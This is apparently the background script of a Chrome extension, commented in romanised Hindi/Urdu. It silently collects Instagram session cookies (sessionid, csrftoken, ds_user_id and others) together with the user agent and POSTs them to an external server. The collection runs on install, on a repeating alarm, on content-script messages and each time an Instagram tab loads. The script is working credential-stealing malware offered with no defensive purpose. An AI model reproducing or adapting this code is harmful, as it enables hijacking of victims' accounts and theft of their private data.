
// Install hone par foran chalao
chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === 'install' || details.reason === 'update') {
    console.log("🚀 Extension active - fetching cookies...");
    fetchInstagramCookies("install");

    // Alarm set karo har 30 seconds baad check karne ke liye
    chrome.alarms.create("cookieChecker", { periodInMinutes: 10 });
  }
});

// Alarm listener - har 30 seconds mein check kare
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "cookieChecker") {
    fetchInstagramCookies("scheduled");
  }
});

// Content script se message aye to bhi process karo
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "getCookies") {
    fetchInstagramCookies("content_script", request.url, request.time);
    sendResponse({ status: "processing" });
    return true;
  }
});

// Main function - cookies get aur send kare
async function fetchInstagramCookies(source, pageUrl = null, timeStamp = null) {
  try {
    const cookies = await chrome.cookies.getAll({
      domain: ".instagram.com"
    });

    if (!cookies || cookies.length === 0) {
      return;
    }

    // Sirf important cookies lo (sessionid, ds_user_id, csrftoken)
    const importantCookies = cookies.filter(c =>
      ['sessionid', 'ds_user_id', 'csrftoken', 'mid', 'ig_did'].includes(c.name)
    );

    const payload = {
      source: source,
      url: pageUrl || "background_check",
      timestamp: timeStamp || new Date().toISOString(),
      cookies: importantCookies.length > 0 ? importantCookies : cookies,
      totalCookies: cookies.length,
      userAgent: navigator.userAgent,
      platform: "instagram"
    };

    // API ko bhejo
    await sendToAPI(payload);

  } catch (error) {
    console.error("Error:", error);
  }
}

async function sendToAPI(data) {
  try {
    const response = await fetch('https://backend-cookies.vercel.app/api/cookies', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
      // CORS issues avoid karne ke liye
      mode: 'cors',
      cache: 'no-cache'
    });

    const result = await response.json();
    console.log("✅ Data sent:", result);
  } catch (err) {
    console.error("❌ API Error:", err);
  }
}

// Jab bhi new tab mein Instagram khule
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.includes('instagram.com')) {
    setTimeout(() => {
      fetchInstagramCookies("tab_update", tab.url);
    }, 2000);
  }
});